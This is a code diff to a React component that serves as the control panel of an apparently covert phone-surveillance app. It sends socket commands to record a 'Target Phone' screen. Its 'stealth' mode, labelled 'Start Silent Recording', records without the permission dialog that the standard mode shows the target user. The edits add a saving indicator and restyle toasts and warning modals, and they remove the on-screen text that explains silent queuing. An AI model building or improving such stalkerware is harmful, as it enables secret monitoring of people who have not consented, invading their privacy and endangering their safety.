@@ -6,7 +6,7 @@ import {
     AlertTriangle, CheckCircle, AlertCircle, X,
     Zap, Shield, Repeat2, ChevronRight, Monitor,
     Wifi, Battery, Smartphone, EyeOff, Sparkles,
-    Info, Film, Lock
+    Info, Film, Lock, RefreshCw
 } from 'lucide-react';
 
 interface ScreenRecordViewProps {
@@ -83,9 +83,12 @@ export default function ScreenRecordView({
     const [showSimpleWarn, setShowSimpleWarn] = useState(false);
     const [showUnlimWarn,  setShowUnlimWarn]  = useState(false);
     const [showStealthNoticeModal, setShowStealthNoticeModal] = useState(false);
+    const [isSaving,       setIsSaving]       = useState(false);
 
     const isRecordingRef = useRef(false);
     isRecordingRef.current = isRecording;
+    const recordingModeRef = useRef<'stealth' | 'simple'>('stealth');
+    recordingModeRef.current = recMode;
 
     // ── Toast helper ──────────────────────────────────────────────────────────
     const showToast = useCallback((type: 'ok'|'warn'|'err', text: string, ms = 4000) => {
@@ -206,12 +209,14 @@ export default function ScreenRecordView({
                     setHasToken(false);
                     setIsRecording(false);
                     setPendingRec(false);
+                    setIsSaving(false);
                     if (selectedDeviceId) {
                         try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                     }
                     break;
                 case 'stealth_timeout':
                     setPendingRec(false);
+                    setIsSaving(false);
                     if (selectedDeviceId) {
                         try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                     }
@@ -221,6 +226,7 @@ export default function ScreenRecordView({
                     setIsRecording(false);
                     setPendingRec(false);
                     setHasToken(false);
+                    setIsSaving(false);
                     if (selectedDeviceId) {
                         try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                     }
@@ -230,6 +236,7 @@ export default function ScreenRecordView({
                     setIsRecording(false);
                     setPendingRec(false);
                     setHasToken(false);
+                    setIsSaving(false);
                     if (selectedDeviceId) {
                         try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                     }
@@ -248,6 +255,7 @@ export default function ScreenRecordView({
 
         const onComplete = (data: any) => {
             if (!data) return;
+            setIsSaving(false);
             setIsRecording(false);
             setPendingRec(false);
             setRecElapsedMs(0);
@@ -263,7 +271,7 @@ export default function ScreenRecordView({
                     elapsedMs: data.elapsedMs || 0,
                     totalMs:   data.totalMs   || 0,
                     reason:    data.reason    || 'unknown',
-                    mode:      data.mode
+                    mode:      data.mode || recordingModeRef.current || recMode || 'stealth'
                 });
                 showToast('ok', `Saved recording — ${fmt(data.elapsedMs || 0)}`);
             }
@@ -299,6 +307,7 @@ export default function ScreenRecordView({
             }));
         } catch {}
 
+        recordingModeRef.current = recMode;
         socket.emit('screen_record_start', {
             uuid: userUuid,
             targetDeviceId: selectedDeviceId,
@@ -328,6 +337,9 @@ export default function ScreenRecordView({
     const handleStop = () => {
         if (!selectedDeviceId || !socket) return;
         socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
+        if (isRecording) {
+            setIsSaving(true);
+        }
         setIsRecording(false);
         setPendingRec(false);
         if (selectedDeviceId) {
@@ -341,15 +353,41 @@ export default function ScreenRecordView({
     return (
         <div className="relative w-full max-w-xl mx-auto space-y-3 pb-24 px-3 sm:px-0">
 
-            {/* ── Toast ──────────────────────────────────────────────────────── */}
+            {/* ── Theme-aligned Toast / In Queue Popup ── */}
             {toast && (
-                <div className={`fixed top-4 left-1/2 -translate-x-1/2 z-[800] flex items-center gap-2.5 px-4 py-2.5 rounded-2xl text-xs font-semibold shadow-2xl backdrop-blur-xl border transition-all animate-in slide-in-from-top-3 ${
-                    toast.type === 'ok'   ? 'bg-emerald-950/90 border-emerald-500/40 text-emerald-300'
-                  : toast.type === 'err'  ? 'bg-rose-950/90    border-rose-500/40    text-rose-300'
-                  :                         'bg-amber-950/90   border-amber-500/40   text-amber-300'
+                <div className={`fixed top-5 left-1/2 -translate-x-1/2 z-[800] flex items-center gap-3 px-4 py-3 rounded-2xl text-xs font-medium shadow-[0_20px_50px_rgba(0,0,0,0.95)] backdrop-blur-2xl border transition-all animate-in slide-in-from-top-3 max-w-[92vw] sm:max-w-md ${
+                    toast.type === 'err'
+                        ? 'bg-[#181214]/95 border-rose-500/40 text-rose-200 shadow-[0_10px_35px_rgba(244,63,94,0.25)]'
+                        : 'clay-card bg-[#141519]/95 border-orange-500/40 text-white shadow-[0_15px_40px_rgba(249,115,22,0.25)] ring-1 ring-orange-500/20'
                 }`}>
-                    {toast.type === 'ok' ? <CheckCircle size={14}/> : <AlertCircle size={14}/>}
-                    <span>{toast.text}</span>
+                    <div className={`w-8 h-8 rounded-xl flex items-center justify-center shrink-0 ${
+                        toast.type === 'err'
+                            ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
+                            : 'bg-orange-500/20 text-orange-400 border border-orange-500/30 shadow-[0_0_12px_rgba(249,115,22,0.35)]'
+                    }`}>
+                        {toast.type === 'err' ? (
+                            <AlertCircle size={16} />
+                        ) : toast.text.toLowerCase().includes('queue') ? (
+                            <Clock size={16} className="animate-spin text-orange-400" />
+                        ) : (
+                            <Sparkles size={16} className="text-orange-400" />
+                        )}
+                    </div>
+                    <div className="flex-1 min-w-0 pr-1">
+                        <p className="font-bold text-white text-xs tracking-tight truncate">
+                            {toast.text.toLowerCase().includes('queue') ? 'Recording In Queue' : 'Screen System Notice'}
+                        </p>
+                        <p className="text-[11px] text-white/60 truncate mt-0.5 font-mono">
+                            {toast.text}
+                        </p>
+                    </div>
+                    <button
+                        type="button"
+                        onClick={() => setToast(null)}
+                        className="p-1 rounded-lg text-white/30 hover:text-white hover:bg-white/10 transition-colors cursor-pointer shrink-0"
+                    >
+                        <X size={14} />
+                    </button>
                 </div>
             )}
 
@@ -365,7 +403,7 @@ export default function ScreenRecordView({
                             <span className="w-2 h-2 rounded-full bg-orange-400 shadow-[0_0_8px_#f97316] animate-pulse shrink-0" />
                         </h2>
                         <div className="flex items-center gap-2 text-xs text-white/50 truncate mt-0.5">
-                            <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${isOnline ? 'bg-emerald-400' : 'bg-white/20'}`}/>
+                            <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${isOnline ? 'bg-orange-400' : 'bg-white/20'}`}/>
                             <span className="truncate">{deviceName || 'Target Phone'}</span>
                         </div>
                     </div>
@@ -375,7 +413,7 @@ export default function ScreenRecordView({
                     {hasToken !== null && (
                         <span className={`text-[10px] font-mono font-semibold px-2.5 py-1 rounded-full border ${
                             hasToken 
-                                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
+                                ? 'bg-orange-500/15 border-orange-500/35 text-orange-400 shadow-[0_0_10px_rgba(249,115,22,0.2)]' 
                                 : 'bg-white/5 border-white/10 text-white/40'
                         }`}>
                             {hasToken ? 'Live Token' : 'Standby'}
@@ -505,11 +543,6 @@ export default function ScreenRecordView({
                                 {recMode === 'stealth' ? 'Start Silent Recording' : 'Start Recording'}
                             </span>
                         </button>
-                        <p className="text-[11px] text-white/40 text-center leading-relaxed font-mono">
-                            {recMode === 'stealth'
-                                ? 'Queues silently • Begins recording the moment target phone screen is active'
-                                : 'Target user will see a permission dialog before recording begins'}
-                        </p>
                     </div>
 
                 ) : pendingRec && !isRecording ? (
@@ -554,14 +587,21 @@ export default function ScreenRecordView({
                             </div>
                         )}
 
-                        <button 
-                            type="button"
-                            onClick={handleStop}
-                            className="w-full py-2.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2 bg-rose-500/20 border border-rose-500/40 text-rose-300 hover:bg-rose-500/30 transition-all cursor-pointer shadow-lg"
-                        >
-                            <Square size={13} className="fill-current"/> 
-                            <span>Stop & Save Recording</span>
-                        </button>
+                        {isSaving ? (
+                            <div className="w-full py-3 rounded-xl bg-orange-500/15 border border-orange-500/30 flex items-center justify-center gap-2.5 text-orange-300 font-bold text-xs animate-pulse">
+                                <RefreshCw className="w-4 h-4 text-orange-400 animate-spin" />
+                                <span>Saving & Finalizing Video...</span>
+                            </div>
+                        ) : (
+                            <button 
+                                type="button"
+                                onClick={handleStop}
+                                className="w-full py-2.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2 bg-rose-500/20 border border-rose-500/40 text-rose-300 hover:bg-rose-500/30 transition-all cursor-pointer shadow-lg"
+                            >
+                                <Square size={13} className="fill-current"/> 
+                                <span>Stop & Save Recording</span>
+                            </button>
+                        )}
                     </div>
                 )}
             </div>
@@ -637,6 +677,26 @@ export default function ScreenRecordView({
                     </div>
                 )}
 
+                {/* Saving / Finalizing progress item */}
+                {isSaving && (
+                    <div className="flex items-center gap-3 px-4 py-3.5 bg-orange-500/10 border-b border-orange-500/20 animate-pulse">
+                        <div className="w-9 h-9 rounded-xl bg-orange-500/20 border border-orange-500/30 flex items-center justify-center text-orange-400 shrink-0">
+                            <RefreshCw size={16} className="animate-spin text-orange-400" />
+                        </div>
+                        <div className="flex-1 min-w-0">
+                            <div className="flex items-center gap-2">
+                                <span className="text-xs font-bold text-white">Saving Recording...</span>
+                                <span className="text-[9px] px-1.5 py-0.5 rounded-md font-semibold uppercase bg-orange-500/20 text-orange-400 font-mono">
+                                    Finalizing
+                                </span>
+                            </div>
+                            <p className="text-[10px] text-white/50 mt-0.5 truncate">
+                                Processing and saving mobile video capture to list
+                            </p>
+                        </div>
+                    </div>
+                )}
+
                 {/* Saved list */}
                 {savedRecs.length > 0 ? (
                     <div className="divide-y divide-white/[0.04]">
@@ -656,9 +716,11 @@ export default function ScreenRecordView({
                                     <div className="flex items-center gap-2">
                                         <span className="text-xs font-bold text-white/80 font-mono">{fmt(rec.elapsedMs)}</span>
                                         <span className={`text-[9px] px-1.5 py-0.5 rounded-md font-semibold uppercase tracking-wide font-mono ${
-                                            rec.mode === 'stealth' ? 'bg-orange-500/20 text-orange-400 border border-orange-500/30' : 'bg-white/10 text-white/40'
+                                            rec.mode === 'simple'
+                                                ? 'bg-white/10 text-white/40 border border-white/10'
+                                                : 'bg-orange-500/20 text-orange-400 border border-orange-500/30'
                                         }`}>
-                                            {rec.mode === 'stealth' ? 'Silent Rec' : 'Standard'}
+                                            {rec.mode === 'simple' ? 'Standard' : 'Silent Rec'}
                                         </span>
                                     </div>
                                     <p className="text-[10px] text-white/35 mt-0.5 font-mono">
@@ -828,8 +890,8 @@ export default function ScreenRecordView({
 
             {/* ── Standard Mode Warning ──────────────────────────────────────── */}
             {showSimpleWarn && (
-                <div className="fixed inset-0 z-[750] bg-black/80 backdrop-blur-sm flex items-end sm:items-center justify-center p-4">
-                    <div className="clay-card w-full max-w-sm p-5 border border-amber-500/25 space-y-4 animate-in slide-in-from-bottom-3">
+                <div className="fixed inset-0 z-[750] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
+                    <div className="clay-card w-full max-w-sm p-5 border border-amber-500/25 space-y-4 animate-in zoom-in-95 duration-200 shadow-2xl">
                         <div className="flex items-center gap-2 text-amber-400">
                             <AlertTriangle size={16}/>
                             <span className="font-bold text-sm">Visible Permission Prompt</span>
@@ -859,8 +921,8 @@ export default function ScreenRecordView({
 
             {/* ── Continuous / Unlimited Warning ─────────────────────────────── */}
             {showUnlimWarn && (
-                <div className="fixed inset-0 z-[750] bg-black/80 backdrop-blur-sm flex items-end sm:items-center justify-center p-4">
-                    <div className="clay-card w-full max-w-sm p-5 border border-rose-500/25 space-y-4 animate-in slide-in-from-bottom-3">
+                <div className="fixed inset-0 z-[750] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
+                    <div className="clay-card w-full max-w-sm p-5 border border-rose-500/25 space-y-4 animate-in zoom-in-95 duration-200 shadow-2xl">
                         <div className="flex items-center gap-2 text-rose-400">
                             <AlertTriangle size={16}/>
                             <span className="font-bold text-sm">Continuous Recording</span>
